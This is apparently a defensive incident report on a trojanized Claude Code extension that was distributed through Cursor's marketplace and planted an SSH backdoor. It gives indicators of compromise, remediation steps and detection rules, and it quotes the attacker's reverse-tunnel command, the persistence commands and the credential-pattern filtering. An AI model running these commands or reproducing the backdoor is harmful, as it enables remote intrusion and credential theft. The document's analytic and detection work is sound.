# Technical Analysis Report: Trojanized Claude Code Extension -- Cursor IDE Supply Chain Attack (2026-10-29)

Prepared by: Actioner
Classification: TLP:CLEAR
Date: 2026-11-03
Version: FINAL 1.0

## Executive Summary

On October 29, 2026, a trojanized build of Anthropic's Claude Code extension (versions 2.1.312 and 2.1.313) was distributed through the Cursor IDE's VS Code Extension Marketplace for approximately 11 hours (02:27 -- 13:35 PDT). The malicious extension was published under Anthropic's legitimate publisher identity (`anthropic.claude-code`), though Anthropic confirmed it did not develop or publish the tampered versions and its systems were not compromised. Cursor estimates up to 5,000 developer systems may have been affected.

The payload -- a ~66-line JavaScript loader injected before the legitimate extension code -- deployed a persistent SSH backdoor. It appended an attacker-controlled Ed25519 public key to the victim's `authorized_keys`, attempted to enable the local SSH service, established a reverse SSH tunnel to the attacker's server at 134[.]209[.]82[.]225, and configured platform-specific persistence (LaunchAgent on macOS, cron on Linux, scheduled task on Windows). A separate HTTP beacon exfiltrated host reconnaissance data including hostname, username, OS details, Git email, and names of up to 40 environment variables matching credential-related patterns (KEY, TOKEN, SECRET, PASS, AWS, GCP). The attacker's C2 server has been taken offline.

## Background: Cursor IDE Extension Marketplace

Cursor is an AI-focused code editor built on VS Code that maintains its own extension marketplace. Unlike Microsoft's VS Code Marketplace and the community-maintained Open VSX registry, Cursor's marketplace is independently operated. The incident was confined to this marketplace; neither the Microsoft VS Code Marketplace, Open VSX, nor npm (`@anthropic-ai/claude-code`) were affected. The mechanism by which the attacker gained the ability to publish under Anthropic's identity on Cursor's marketplace has not been publicly disclosed.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2026-10-29 ~09:27 UTC | Malicious versions 2.1.312/2.1.313 published to Cursor marketplace |
| 2026-10-29 ~09:27 -- 20:35 UTC | Malicious extension live; up to 5,000 installs/auto-updates |
| 2026-10-29 ~20:35 UTC | Cursor removes malicious extension, suspends marketplace |
| 2026-10-29 (later) | Cursor audits all extensions, finds no other tampering, rotates keys |
| 2026-10-30 | Microsoft publishes detailed technical analysis; Cursor publishes security notice |
| 2026-10-30 | Anthropic publishes clean version 2.1.314; attacker C2 server taken offline |

## Root Cause: Supply Chain Compromise of Cursor Extension Marketplace

The attacker published a trojanized VSIX package to Cursor's extension marketplace under Anthropic's legitimate extension ID (`anthropic.claude-code`). The injection method -- whether through stolen publisher credentials, a marketplace vulnerability, or another vector -- has not been publicly disclosed. The malicious code was a ~66-line JavaScript function prepended to the legitimate `extension.js`, which executed before normal extension initialization. The extension continued to function normally after payload execution to avoid alerting users.

## Technical Analysis of the Malicious Payload

### 1. Loader Injection and Module Execution

A malicious JavaScript function was injected at the top of the extension's main entry point (`extension.js`). It runs automatically when the extension module loads and again when the extension's webview opens. The loader uses only built-in Node.js and OS tools, downloading no second-stage executable. All output is suppressed and errors are silently caught to avoid detection.

### 2. Host Reconnaissance and Credential Enumeration

The payload collects:
- Hostname, local username, OS type, CPU architecture
- Home directory and current working directory
- Global Git email (`git config --global user.email`)
- Public IP address (queried from `api[.]ipify[.]org`)
- Names (not values) of up to 40 environment variables whose names contain: KEY, TOKEN, SECRET, PASS, AWS, or GCP

### 3. SSH Key Implant and Service Enablement

The payload checks `~/.ssh/authorized_keys` for the `svc-telemetry` marker. If absent, it appends an attacker-controlled Ed25519 public key with the comment `svc-telemetry`. It then attempts to enable the local SSH service:
- **macOS:** `systemsetup -setremotelogin on` (requires admin rights)
- **Windows:** `Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0` (requires elevation)

Cursor reports that these commands failed on most macOS and Windows systems due to insufficient privileges. However, the SSH key and persistence artifacts may still have been written.

### 4. Reverse SSH Tunnel

The payload establishes a reverse SSH tunnel to the attacker's server:
- Command: `ssh -N -R '*:0:localhost:22' tunnel@134.209.82.225`
- Uses `autossh -M 0` on Unix-like systems where available, falls back to `ssh`
- On Windows: hidden PowerShell retry loop
- SSH options: `StrictHostKeyChecking=no`, `UserKnownHostsFile=/dev/null`, `ServerAliveInterval=30`, `ServerAliveCountMax=3`, `ExitOnForwardFailure=yes`, `IdentitiesOnly=yes`
- Remote port `0` requests the server to allocate a dynamic port
- The tunnel private key is written to a hidden temporary file matching `.stk_[0-9a-f]{10}`
- Retry interval: 60 seconds after SSH process exits

### 5. Platform-Specific Persistence

#### macOS
- **LaunchAgent:** `~/Library/LaunchAgents/com.apple.sysmond.plist` with `RunAtLoad` and `KeepAlive`, label `com.apple.sysmond` (mimics the legitimate `sysmond` system daemon)
- **Scripts:** `~/.config/.smt` (tunnel retry script), `~/.config/.smtk` (tunnel private key)

#### Linux
- **Crontab:** `@reboot` entry referencing `~/.config/.smt`
- **Scripts:** `~/.config/.smt`, `~/.config/.smtk`

#### Windows
- **Scheduled task:** Named `SysMon` (mimics Sysmon monitoring tool), requests SYSTEM privileges via `schtasks /create /tn SysMon`
- **Startup fallback:** `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\sysmon.cmd`
- **Scripts:** `%USERPROFILE%\.config\smt.cmd`, `%USERPROFILE%\.config\smtk`

### 6. Delayed Beacon / C2 Communication

A callback sends collected host details and environment variable names to the C2 endpoint:
- **URL:** `hxxp://134[.]209[.]82[.]225:8099/beacon` (HTTP POST, unencrypted)
- **Local fallback:** `127[.]0[.]0[.]1:8099/beacon`
- **Protocol:** HTTP (no TLS)

### 7. Anti-Forensics / Evasion Techniques

- Extension continues working normally after payload execution
- All command output suppressed; errors silently caught
- Hidden dotfiles for persistence scripts (`.smt`, `.smtk`)
- Hidden temporary tunnel identity file (`.stk_*`)
- Persistence entries mimic legitimate system components (`com.apple.sysmond`, `SysMon`)
- Disables SSH host-key verification and bypasses `known_hosts`
- Uses only built-in OS tools (no downloaded binaries)
- Marker check prevents duplicate `authorized_keys` entries
- Public IP lookup via legitimate services (`api[.]ipify[.]org`, `ifconfig[.]me`)

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` or `hxxp://` (e.g., `hxxps://evil[.]com/payload`)
> - Domains: `[.]` replacing dots (e.g., `evil[.]com`)
> - IP addresses: `[.]` replacing dots (e.g., `1[.]2[.]3[.]4`)

### Package / Software Level

| Package / Component | Malicious Version | Description |
|---------------------|-------------------|-------------|
| anthropic.claude-code (VSIX, darwin-arm64) | 2.1.312 | Trojanized extension with SSH backdoor loader |
| anthropic.claude-code (VSIX, win32-x64) | 2.1.312 | Trojanized extension with SSH backdoor loader |
| anthropic.claude-code (VSIX, darwin-arm64) | 2.1.313 | Trojanized extension with SSH backdoor loader |
| anthropic.claude-code (VSIX, win32-x64) | 2.1.313 | Trojanized extension with SSH backdoor loader |

### File System

| Platform | Path | Hash (SHA256) | Description |
|----------|------|---------------|-------------|
| All | extension.js (inside VSIX) | ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15 | Malicious JS entry point (MD5: f49bcd657ef1e626e85ce858958c1769) |
| macOS | VSIX 2.1.312 darwin-arm64 | fcbb327e38e61c4fec795e0d0591f52cd1014b813d20a5912104953c3a17c364 | Trojanized package (MD5: e0d64d53e802a0217ba6f0e656ed2f20) |
| Windows | VSIX 2.1.312 win32-x64 | 3de1722901165769893bef57c72594e9a54459faa23f3091b136b79966edd081 | Trojanized package (MD5: bd3b71ddf3d0cc3af76249afd2c0eda1) |
| macOS | VSIX 2.1.313 darwin-arm64 | 80402fdcad8799285fd93044976973ca000da7995fb93363f819bb8e4f84ee6c | Trojanized package (MD5: 34e491161e056c9b899a79b602ac73b9) |
| Windows | VSIX 2.1.313 win32-x64 | 6786ec90cbd45949695bd7805c9fbb26cfc91bc5fc897de0183d9bcb9cb21731 | Trojanized package (MD5: 7838a3be2ca0ff08c1bdb160ef516d39) |
| All | Decoded tunnel private key | 7e0a52885fadee05544a9e99eb18c792bec05900a5e1a66d68f8383decb0e278 | Ed25519 private key for outbound tunnel auth |
| macOS | ~/Library/LaunchAgents/com.apple.sysmond.plist | -- | Fake LaunchAgent for persistence |
| macOS/Linux | ~/.config/.smt | -- | Tunnel retry shell script |
| macOS/Linux | ~/.config/.smtk | -- | Tunnel private key on disk |
| Linux/macOS | /tmp/.stk\_\<10 hex\> or $TMPDIR/.stk\_\<10 hex\> | -- | Temporary tunnel identity file |
| Windows | %USERPROFILE%\\.config\\smt.cmd | -- | Tunnel retry batch script |
| Windows | %USERPROFILE%\\.config\\smtk | -- | Tunnel private key on disk |
| Windows | %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sysmon.cmd | -- | Startup folder persistence fallback |
| Windows | %TEMP%\\.stk\_\<10 hex\> | -- | Temporary tunnel identity file |

### Network

| Type | Value | Context |
|------|-------|---------|
| IP | 134[.]209[.]82[.]225 | C2 server -- SSH tunnel endpoint and HTTP beacon target |
| URL Pattern | hxxp://134[.]209[.]82[.]225:8099/beacon | HTTP POST beacon for host reconnaissance exfiltration |
| URL Pattern | hxxp://127[.]0[.]0[.]1:8099/beacon | Local loopback beacon fallback |
| SSH Target | tunnel[at]134[.]209[.]82[.]225 | Reverse SSH tunnel user and destination |
| SSH Key Comment | svc-telemetry | Marker in authorized_keys for the implanted public key |
| SSH Key Fingerprint | SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk | Fingerprint of the implanted public key |
| SSH Key Fingerprint | SHA256:KOAU57+ZG6u3MG4WwzPzPX2O5YEe9qdOC1Bl+6MVyDQ | Fingerprint of the reverse-tunnel private key |

### Behavioral

- SSH reverse tunnel with wildcard bind (`*:0:localhost:22`) and disabled host-key checking
- `autossh -M 0` or `ssh -N -R` with `StrictHostKeyChecking=no` and `UserKnownHostsFile=/dev/null`
- Environment variable name enumeration filtering for KEY, TOKEN, SECRET, PASS, AWS, GCP
- `schtasks /create /tn SysMon` on Windows for scheduled task persistence
- `systemsetup -setremotelogin on` on macOS to enable SSH
- `Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0` on Windows to enable SSH
- LaunchAgent creation at `~/Library/LaunchAgents/com.apple.sysmond.plist`
- Crontab `@reboot` entry on Linux referencing `~/.config/.smt`
- Hidden dotfiles in `~/.config/` for persistence scripts

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1195.002 | Supply Chain Compromise: Compromise Software Supply Chain | Trojanized Claude Code extension published to Cursor marketplace under Anthropic's identity |
| T1098.004 | Account Manipulation: SSH Authorized Keys | Attacker Ed25519 public key appended to authorized_keys with svc-telemetry comment |
| T1572 | Protocol Tunneling | Reverse SSH tunnel to C2 server with dynamic port allocation |
| T1053.005 | Scheduled Task/Job: Scheduled Task | Windows scheduled task named SysMon for persistence |
| T1053.003 | Scheduled Task/Job: Cron | Linux crontab @reboot entry for persistence |
| T1543.001 | Create or Modify System Process: Launch Agent | macOS LaunchAgent com.apple.sysmond.plist for persistence |
| T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | Windows Startup folder fallback with sysmon.cmd |
| T1082 | System Information Discovery | Collection of hostname, OS, architecture, home directory, working directory |
| T1033 | System Owner/User Discovery | Collection of username and Git email |
| T1059.001 | Command and Scripting Interpreter: PowerShell | Hidden PowerShell retry loop on Windows |
| T1071.001 | Application Layer Protocol: Web Protocols | HTTP POST beacon to /beacon endpoint on port 8099 |
| T1036.004 | Masquerading: Masquerade Task or Service | Persistence entries named after legitimate tools (SysMon, com.apple.sysmond) |

## Impact Assessment

- **Breadth:** Up to 5,000 developer systems (Cursor's estimate), Windows and macOS
- **Depth:** Full remote access via SSH if the local SSH service was successfully enabled; credential exposure risk from environment variable name enumeration
- **Stealth:** Extension continued functioning normally; persistence mechanisms mimicked legitimate system components
- **Exposure window:** ~11 hours on October 29, 2026
- **Mitigating factors:** SSH service enablement requires admin/root privileges, which the extension lacked on most systems, likely blocking the tunnel login on many affected hosts; however, the SSH key, persistence scripts, and beacon data may still have been written

## Detection & Remediation

### Immediate Detection

**Check for the implanted SSH key:**

macOS/Linux:
```bash
grep "svc-telemetry" ~/.ssh/authorized_keys
```

Windows (PowerShell):
```powershell
Select-String -Path "$env:USERPROFILE\.ssh\authorized_keys" -Pattern "svc-telemetry"
Select-String -Path "C:\ProgramData\ssh\administrators_authorized_keys" -Pattern "svc-telemetry" -ErrorAction SilentlyContinue
```

**Check for persistence artifacts:**

macOS:
```bash
ls -la ~/Library/LaunchAgents/com.apple.sysmond.plist
ls -la ~/.config/.smt ~/.config/.smtk
```

Linux:
```bash
crontab -l | grep ".smt"
ls -la ~/.config/.smt ~/.config/.smtk
```

Windows (PowerShell):
```powershell
schtasks /query /tn SysMon 2>$null
Test-Path "$env:USERPROFILE\.config\smt.cmd"
Test-Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysmon.cmd"
```

### Remediation

1. **Isolate** affected hosts showing evidence of execution or backdoor installation
2. **Remove the SSH key** -- verify by fingerprint (`SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk`) before removing; preserve unrelated keys
3. **Remove persistence mechanisms** -- inspect each entry's configured action before removal (names alone are insufficient)
4. **Kill tunnel processes** -- terminate any `ssh`/`autossh` processes connecting to 134[.]209[.]82[.]225
5. **Remove dropped files** -- delete `.smt`, `.smtk`, `.stk_*` files and startup entries
6. **Uninstall the extension** -- note that this does not remove artifacts written outside the extension directory
7. **Rotate credentials** -- rotate all secrets, tokens, and API keys accessible from affected hosts, especially those matching the enumerated environment variable patterns
8. **Consider host rebuild** for systems with confirmed SSH service enablement
9. **Run vendor remediation scripts** -- Cursor published `remediate-macos.sh` (run as affected user, not root) and `remediate-windows.ps1` (run in elevated PowerShell)

### Long-Term Hardening

- Enable extension signature verification and restrict marketplace sources
- Monitor `authorized_keys` modifications via file integrity monitoring
- Restrict SSH service enablement to managed configuration
- Audit environment variable naming to minimize credential exposure
- Implement network monitoring for outbound SSH tunnels to unknown destinations
- Review extension auto-update policies to allow review before updates apply

## Detection Rules

These detections target the specific artifacts of the trojanized Claude Code Cursor extension campaign (PoC/advisory-specific altitude, strict leniency). Sigma rules convert cleanly to Splunk and CrowdStrike LogScale; compiles != fires -- verify in your pipeline.

### Sigma: Reverse SSH Tunnel Matching Malicious Claude Code Extension Pattern

Detects SSH reverse tunnel command lines with the distinctive wildcard bind, dynamic port to localhost:22, and disabled host-key checking used by this campaign.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0 (excl attacktag/d3_fendtag — MITRE data fetch blocked by proxy, not a rule issue); splunk 0; log_scale 0. Values are real (not defanged). CommandLine contains|all is AND logic matching the four distinctive fragments. -->
```yaml
title: Reverse SSH Tunnel Matching Malicious Claude Code Extension Pattern
id: 4b8e2a1f-c9d3-4e7a-b5f6-1a2d3c4e5f67
status: experimental
description: >
    Detects SSH reverse tunnel command lines consistent with the trojanized Claude Code
    extension (versions 2.1.312/2.1.313) that deployed a persistent SSH backdoor via
    the Cursor IDE marketplace. The rule keys on the distinctive combination of
    remote-forward wildcard bind with dynamic port allocation to localhost:22 and
    host-key verification disabled.
references:
    - https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/
    - https://cursor.com/blog/claude-code-extension-security-notice
author: Actioner
date: 2026/11/03
tags:
    - attack.t1572
logsource:
    category: process_creation
    product: linux
detection:
    selection_ssh:
        Image|endswith:
            - '/ssh'
            - '/autossh'
        CommandLine|contains|all:
            - '-N'
            - '-R'
            - '*:0:localhost:22'
    selection_hostkey:
        CommandLine|contains: 'StrictHostKeyChecking=no'
    condition: selection_ssh and selection_hostkey
falsepositives:
    - Legitimate reverse SSH tunnels with wildcard bind and disabled host-key checking are uncommon but possible in CI/CD
level: high
```

### Sigma: Network Connection to Claude Code Extension C2 Server

Detects outbound network connections to the known C2 IP address and beacon port (134[.]209[.]82[.]225:8099).
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0; splunk 0; log_scale 0. Specific IP+port combination; low FP risk while C2 IP is attributable. -->
```yaml
title: Network Connection to Claude Code Extension C2 Server
id: 7f3a9c2e-d1b4-4f8e-a6c5-2b3d4e5f6a78
status: experimental
description: >
    Detects outbound network connections to the known C2 IP address and beacon port
    used by the trojanized Claude Code Cursor extension (134.209.82.225 on port 8099).
references:
    - https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/
    - https://cursor.com/blog/claude-code-extension-security-notice
author: Actioner
date: 2026/11/03
tags:
    - attack.t1071.001
logsource:
    category: network_connection
detection:
    selection:
        DestinationIp: '134.209.82.225'
        DestinationPort: 8099
    condition: selection
falsepositives:
    - Unlikely; this is a specific IP and port combination associated with the campaign
level: critical
```

### Sigma: Scheduled Task SysMon Created by Malicious Claude Code Extension

Detects creation of the `SysMon` scheduled task via `schtasks`, a Windows persistence mechanism from this campaign.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0; splunk 0; log_scale 0. The legitimate Sysmon tool installs via Sysmon.exe -i, not via schtasks /create /tn SysMon. -->
```yaml
title: Scheduled Task SysMon Created by Malicious Claude Code Extension
id: 9e1b3d5f-a2c4-4b6e-8d7f-3c4a5b6c7d89
status: experimental
description: >
    Detects creation of the scheduled task named SysMon via schtasks, a persistence
    mechanism used by the trojanized Claude Code extension to maintain its reverse
    SSH tunnel on Windows systems.
references:
    - https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/
    - https://cursor.com/blog/claude-code-extension-security-notice
author: Actioner
date: 2026/11/03
tags:
    - attack.t1053.005
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\schtasks.exe'
        CommandLine|contains|all:
            - '/create'
            - '/tn'
            - 'SysMon'
    condition: selection
falsepositives:
    - Legitimate Sysmon installation uses a different binary (Sysmon.exe -i), not schtasks with task name SysMon
level: high
```

### Sigma: Fake Sysmond LaunchAgent Created by Malicious Claude Code Extension

Detects creation of the `com.apple.sysmond.plist` user-level LaunchAgent, which the real `sysmond` daemon does not use.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0; splunk 0; log_scale 0. The real sysmond is a system daemon at /usr/libexec/sysmond; it has no user LaunchAgent. -->
```yaml
title: Fake Sysmond LaunchAgent Created by Malicious Claude Code Extension
id: 2a4c6e8f-b1d3-4f5a-9c7e-5d6e7f8a9b01
status: experimental
description: >
    Detects creation of the com.apple.sysmond.plist LaunchAgent, a persistence
    mechanism used by the trojanized Claude Code extension on macOS to maintain
    its reverse SSH tunnel. The real sysmond is a system daemon and does not use a
    user-level LaunchAgent at this path.
references:
    - https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/
    - https://cursor.com/blog/claude-code-extension-security-notice
author: Actioner
date: 2026/11/03
tags:
    - attack.t1543.001
logsource:
    category: file_event
    product: macos
detection:
    selection:
        TargetFilename|endswith: '/Library/LaunchAgents/com.apple.sysmond.plist'
    condition: selection
falsepositives:
    - No known legitimate use; the real sysmond does not install a user-level LaunchAgent at this path
level: high
```

### Sigma: Hidden Tunnel Identity and Script Files from Claude Code Extension

Detects creation of the hidden persistence scripts (`.smt`, `.smtk`) and temporary tunnel identity files (`.stk_*`) dropped by this campaign.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0; splunk 0; log_scale 0. Uses regex for .stk_ pattern with 10-char hex suffix. Cross-platform (no product specified). -->
```yaml
title: Hidden Tunnel Identity and Script Files from Claude Code Extension
id: 5c7e9a1b-d3f5-4a2c-8b6d-4e5f6a7b8c90
status: experimental
description: >
    Detects creation of the hidden persistence scripts (.smt, .smtk) and temporary
    tunnel identity files (.stk_*) dropped by the trojanized Claude Code extension
    in the user config directory.
references:
    - https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/
    - https://cursor.com/blog/claude-code-extension-security-notice
author: Actioner
date: 2026/11/03
tags:
    - attack.t1572
logsource:
    category: file_event
detection:
    selection_config:
        TargetFilename|endswith:
            - '/.config/.smt'
            - '/.config/.smtk'
            - '\.config\smt.cmd'
            - '\.config\smtk'
    selection_stk:
        TargetFilename|re: '[/\\]\.stk_[0-9a-f]{10}$'
    condition: selection_config or selection_stk
falsepositives:
    - Unlikely; these hidden filenames are distinctive artifacts of this campaign
level: high
```

### Snort: HTTP Beacon to Claude Code Extension C2

Detects HTTP traffic to the `/beacon` URI on the campaign's C2 server.
**Status:** compile ⚠️ uncompiled (structural check only) · confidence: high
<!-- audit: snort binary not available in this environment. Structural check: http service, http_uri and http_header sticky buffers, flow established to_server, content with fast_pattern, all options semicolon-terminated, sid in 2100000+ range. -->
```snort
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - HTTP Beacon to Claude Code Extension C2 (134.209.82.225:8099/beacon)"; flow:established,to_server; http_uri; content:"/beacon", fast_pattern; http_header; content:"134.209.82.225"; classtype:trojan-activity; reference:url,www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/; reference:url,cursor.com/blog/claude-code-extension-security-notice; metadata:author Actioner, created 2026-11-03; sid:2100001; rev:1;)
```

### Suricata: HTTP Beacon to Claude Code Extension C2

Detects HTTP POST to the `/beacon` URI targeting the campaign's C2 server (134[.]209[.]82[.]225:8099).
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T exit 0; Suricata 7.0.3. http protocol with dot-notation buffers (http.uri, http.host). flow established,to_server. startswith on /beacon limits scope. -->
```suricata
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - HTTP Beacon to Claude Code Extension C2 (134.209.82.225:8099/beacon)"; flow:established,to_server; http.uri; content:"/beacon"; startswith; http.host; content:"134.209.82.225"; classtype:trojan-activity; reference:url,www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/; reference:url,cursor.com/blog/claude-code-extension-security-notice; metadata:author Actioner, created_at 2026-11-03; sid:2200001; rev:1;)
```

### Suricata: Reverse SSH Tunnel to Claude Code Extension C2 Server

Detects outbound SSH connections to the known C2 IP (134[.]209[.]82[.]225) used for reverse tunneling.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata -T exit 0; Suricata 7.0.3. ssh protocol, specific destination IP, flow to_server. Simple but highly specific to this campaign's infrastructure. -->
```suricata
alert ssh $HOME_NET any -> 134.209.82.225 any (msg:"Actioner - Reverse SSH Tunnel to Claude Code Extension C2 Server"; flow:established,to_server; classtype:trojan-activity; reference:url,www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/; reference:url,cursor.com/blog/claude-code-extension-security-notice; metadata:author Actioner, created_at 2026-11-03; sid:2200002; rev:1;)
```

### YARA: Malicious Claude Code Cursor Extension JS Payload

Detects the malicious JavaScript payload by its combination of distinctive strings: the `svc-telemetry` SSH key comment, the C2 IP, tunnel/persistence paths, and credential-related environment variable filters.
**Status:** compile ✅ compiles · confidence: high · sample: fired ✓
<!-- audit: yarac exit 0. Positive test: constructed file with published indicator strings — fired. Negative test: benign VS Code extension — quiet. Condition requires anchor strings ($svc_key AND $c2_ip) plus 3 of 8 campaign artifacts plus 3 of 6 env-filter strings, which limits FP to files containing both anchors and multiple campaign-specific paths. -->
```yara
rule Malware_ClaudeCode_Cursor_Extension_Payload
{
    meta:
        description = "Detects the malicious JavaScript payload injected into the trojanized Claude Code extension (versions 2.1.312/2.1.313) distributed via the Cursor IDE marketplace"
        author = "Actioner"
        date = "2026-11-03"
        reference = "https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/"
        hash = "ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15"
        severity = "critical"

    strings:
        $beacon = "/beacon" ascii
        $svc_key = "svc-telemetry" ascii
        $tunnel_arg = "*:0:localhost:22" ascii
        $smt_script = ".config/.smt" ascii
        $smtk_file = ".config/.smtk" ascii
        $stk_pattern = ".stk_" ascii
        $launchagent = "com.apple.sysmond" ascii
        $hostkey_opt = "StrictHostKeyChecking=no" ascii
        $knownh_opt = "UserKnownHostsFile=/dev/null" ascii
        $c2_ip = "134.209.82.225" ascii
        $env_filter1 = "KEY" ascii
        $env_filter2 = "TOKEN" ascii
        $env_filter3 = "SECRET" ascii
        $env_filter4 = "PASS" ascii
        $env_filter5 = "AWS" ascii
        $env_filter6 = "GCP" ascii

    condition:
        filesize < 10MB and
        $svc_key and
        $c2_ip and
        3 of ($beacon, $tunnel_arg, $smt_script, $smtk_file, $stk_pattern, $launchagent, $hostkey_opt, $knownh_opt) and
        3 of ($env_filter*)
}
```

## Lessons Learned

1. **Extension marketplace trust boundaries are fragile.** The incident demonstrates that even when a legitimate vendor (Anthropic) did not publish a package, its identity can be impersonated on a third-party marketplace. Extension auto-update mechanisms can turn a brief window of compromise into widespread impact.

2. **Developer tools are high-value supply chain targets.** Developer workstations often hold credentials, API keys, and access to production infrastructure. The payload's environment variable enumeration (targeting KEY, TOKEN, SECRET, PASS, AWS, GCP) reflects a deliberate focus on credential exposure from developer environments.

3. **SSH-based persistence is difficult to detect without monitoring.** The payload used only built-in tools and standard SSH capabilities. Without file integrity monitoring on `authorized_keys` and network monitoring for outbound SSH tunnels, the backdoor would be difficult to detect.

4. **Extension removal does not equal remediation.** The payload wrote standalone persistence scripts and SSH keys outside the extension's install directory. Organizations must verify and remove all artifacts, not just uninstall the extension.

## Sources

- [Microsoft Security Blog: Inside Malicious Claude Code-Branded Cursor Extension](https://www.microsoft.com/en-us/security/blog/2026/10/30/inside-malicious-claude-code-branded-cursor-extension-persistent-ssh-backdoor/) -- primary technical analysis with IOCs, TTPs, and Defender detections
- [Cursor Security Notice: Malicious Anthropic.claude-code Extension](https://cursor.com/blog/claude-code-extension-security-notice) -- vendor incident notice with full IOC list, remediation scripts, and VSIX hashes
- [The Hacker News: Trojanized Claude Code Extension Hits Cursor IDE](https://thehackernews.com/2026/10/official-claude-code-vs-code-extension.html) -- additional coverage with timeline details and 5,000-user estimate
- [SecurityWeek: Malicious Claude Code Extension Served in Cursor Supply Chain Attack](https://www.securityweek.com/malicious-claude-code-extension-served-in-cursor-supply-chain-attack/) -- industry coverage with vendor response details

---
*Report generated by Actioner*
